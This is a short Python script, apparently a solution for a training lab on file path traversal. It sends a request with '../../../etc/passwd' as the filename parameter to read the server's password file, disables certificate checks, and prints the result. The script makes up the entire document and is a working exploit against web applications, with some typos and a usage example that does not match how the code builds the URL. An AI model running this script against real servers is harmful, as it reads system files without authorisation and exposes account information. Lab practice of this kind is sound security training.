# Lab 1 - File Path Traversal , Simple Case
# Targfet Goal - Retrieve the contents of the /etcs/passwd file
# Analysis:
# /var/www/images/65.jpg
# /etc/passwd
# this is an unathenticated file path traversal vulnerability, we can manipulate the file path to access sensitive files on the server.

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
def directory_traveral_exploit(url):
    image_url = url + '/image?filename=../../../etc/passwd'
    try:
        r = requests.get(image_url, verify=False)
        if 'root:x' in r.text:
            print(f"[+] Successfully retrieved the contents of /etc/passwd file:")
            print(r.text)
        else:
            print(f"[-] Failed to retrieve the contents of /etc/passwd file")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        sys.exit(1)
def main():
    if len(sys.argv) != 2:
        print (f"Usage: {sys.argv[0]} <url>")
        print (f"Example: {sys.argv[0]} http://example.com/images/65.jpg")
        sys.exit(1)

    url = sys.argv[1]
    print (f"[*] Exploiting the directory traversal vulnerability of URL: {url}")
    directory_traveral_exploit(url)


if __name__ == "__main__":
    main()
    